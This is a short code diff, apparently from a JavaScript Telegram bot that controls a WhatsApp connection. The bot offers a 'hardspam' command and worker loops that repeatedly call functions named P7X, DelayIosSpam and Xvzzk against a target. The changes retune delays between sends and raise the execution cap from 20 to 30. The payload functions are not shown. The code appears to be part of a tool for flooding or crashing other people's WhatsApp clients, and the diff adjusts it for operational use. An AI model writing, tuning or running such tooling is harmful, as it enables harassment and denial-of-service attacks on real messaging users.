@@ -2475,7 +2475,7 @@ async function runDurationTask(task) {
                             throw new Error("Socket unavailable");
                         }
                         await P7X(sock, task.target);
-                        await sleep(1500);
+                        await sleep(3000);
                         console.log(
                             `[INSTANCE ${instanceId}] EXEC ${i + 1}`
                         );
@@ -2680,7 +2680,7 @@ Status      : Success
                     }
                     await DelayIosSpam(sock, target);
                     await Xvzzk(sock, target);
-                    await sleep(1000)
+                    await sleep(3000)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
                     autoRestartOn408(e);
@@ -2713,8 +2713,8 @@ bot.command('hardspam', checkExecutionLimit, checkWhatsAppConnection, checkPremi
     let executionCount =
         parseInt(args[2]) || 1;
     
-    if (executionCount > 20) {
-        executionCount = 20;
+    if (executionCount > 30) {
+        executionCount = 30;
     }
     
     if (!q) return ctx.reply(
@@ -2787,7 +2787,7 @@ Dispatch engine initialized.
                             }
         
                             await P7X(sock, target);
-                            await sleep(1500)
+                            await sleep(3000)
         
                             console.log(
                                 `[INSTANCE ${instanceId}] Exec ${i + 1}`
